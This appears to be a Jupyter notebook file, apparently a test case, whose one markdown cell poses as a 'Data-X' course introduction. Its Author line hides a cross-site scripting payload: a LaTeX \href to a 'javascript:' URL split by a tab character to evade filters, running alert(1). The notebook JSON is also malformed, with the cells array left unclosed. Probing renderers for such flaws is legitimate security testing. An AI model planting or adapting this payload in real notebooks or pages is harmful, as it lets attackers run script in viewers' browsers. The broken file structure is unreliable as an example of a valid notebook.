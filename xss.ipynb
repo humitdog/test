{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![data-x](https://raw.githubusercontent.com/afo/data-x-plaksha/master/imgsource/dx_logo.png) \n",
    "\n",
    "## Introduction to Data-X\n",
    "Mostly basics about Anaconda, Git, Python, and Jupyter Notebooks\n",
    "\n",
    "### Author: $x \\href{java\x09script:alert(1)}{=} y^2 + 1$\n",
    "\n",
    "---\n"
   ]
  }
 "nbformat": 4,
 "nbformat_minor": 4
}
